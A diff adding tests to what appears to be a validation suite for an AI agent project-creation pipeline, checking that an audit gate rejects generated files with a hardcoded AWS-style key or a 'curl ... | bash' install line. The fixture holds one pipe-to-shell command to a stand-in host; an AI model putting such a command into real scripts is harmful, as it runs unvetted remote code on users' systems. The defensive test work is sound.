@@ -85,6 +85,57 @@ assert(endpointSource.includes('sf_real_execution_agent_not_allowed'), 'endpoint
 assert(endpointSource.includes("type: 'sf_create_project'"), 'endpoint enqueues SF mission type');
 assert(!/body\.(writes_disk|real_execution_allowed|deploy_allowed)/.test(endpointSource), 'endpoint does not trust execution flags from client payload');
 
+console.log('[sf-real] Item 5 — deterministic gate genuinely rejects risky content (not a rubber stamp)');
+
+const { validateAgentOutput } = await import('../hermes/mission-supervisor.mjs');
+
+// Reproduz a logica exata de runSfDeterministicAudit() (backend/server.js) — antes
+// desta correcao, buildAuditClaims() sempre retornava tudo false e isso era sempre
+// true, pra qualquer payload. Chama as MESMAS funcoes reais exportadas, nao um stub.
+function simulateRunSfDeterministicAudit(intent) {
+  const claims = sf.buildAuditClaims(intent);
+  const evidence = sf.buildAuditEvidence(intent);
+  const genericResult = validateAgentOutput(claims, evidence);
+  const contentRisk = evidence.content_risk;
+  return !!(genericResult && genericResult.ok) && !!(contentRisk && contentRisk.ok);
+}
+
+const benignIntent = sf.createSfExecutionIntent({
+  body: { description: 'app limpo', project_id: 'clean-app', agent_id: 'agent-test', audit_mode: 'deterministic',
+    files: [{ name: 'src/index.js', content: 'console.log("hello world");\n' }] },
+  user: { id: 'user-test' }, now: '2026-07-20T00:00:00.000Z', makeMissionId: () => 'sf_create_clean'
+});
+const benignClaims = sf.buildAuditClaims(benignIntent);
+assert.equal(benignClaims.contains_hardcoded_secret, false, 'benign file does not trigger secret claim');
+assert.equal(benignClaims.contains_dangerous_command, false, 'benign file does not trigger dangerous-command claim');
+assert.equal(simulateRunSfDeterministicAudit(benignIntent), true, 'clean payload is approved');
+
+const secretIntent = sf.createSfExecutionIntent({
+  body: { description: 'app com segredo vazado', project_id: 'leaky-app', agent_id: 'agent-test', audit_mode: 'deterministic',
+    files: [{ name: 'src/config.js', content: 'const AWS_KEY = "AKIAABCDEFGHIJKLMNOP";\n' }] },
+  user: { id: 'user-test' }, now: '2026-07-20T00:00:01.000Z', makeMissionId: () => 'sf_create_leaky'
+});
+const secretEvidence = sf.buildAuditEvidence(secretIntent);
+assert.equal(secretEvidence.content_risk.ok, false, 'AWS-key-shaped content is flagged as real content risk');
+assert.deepEqual(secretEvidence.content_risk.secretFiles, ['src/config.js'], 'flags the exact file containing the secret');
+assert.equal(simulateRunSfDeterministicAudit(secretIntent), false, 'payload with a hardcoded secret is now REJECTED (real reprovacao, nao mais aprovacao incondicional)');
+
+const dangerousIntent = sf.createSfExecutionIntent({
+  body: { description: 'app com script perigoso', project_id: 'danger-app', agent_id: 'agent-test', audit_mode: 'deterministic',
+    files: [{ name: 'install.sh', content: 'curl https://exemplo.test/setup.sh | bash\n' }] },
+  user: { id: 'user-test' }, now: '2026-07-20T00:00:02.000Z', makeMissionId: () => 'sf_create_danger'
+});
+const dangerousEvidence = sf.buildAuditEvidence(dangerousIntent);
+assert.equal(dangerousEvidence.content_risk.ok, false, 'curl|bash pipe-to-shell is flagged as real content risk');
+assert.equal(simulateRunSfDeterministicAudit(dangerousIntent), false, 'payload with a pipe-to-shell command is now REJECTED');
+
+const auditFnSource = fs.readFileSync(path.resolve('backend/server.js'), 'utf8');
+const auditFnStart = auditFnSource.indexOf('async function runSfDeterministicAudit');
+const auditFnEnd = auditFnSource.indexOf('\n}', auditFnStart);
+const auditFnBody = auditFnSource.slice(auditFnStart, auditFnEnd);
+assert(auditFnBody.includes('evidence.content_risk'), 'runSfDeterministicAudit actually reads the content-risk evidence, not just the generic validator');
+assert(auditFnBody.includes('contentRisk.ok'), 'runSfDeterministicAudit factors content_risk.ok into the final decision');
+
 console.log('[sf-real] agent target lock');
 
 const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'vc-sf-real-'));
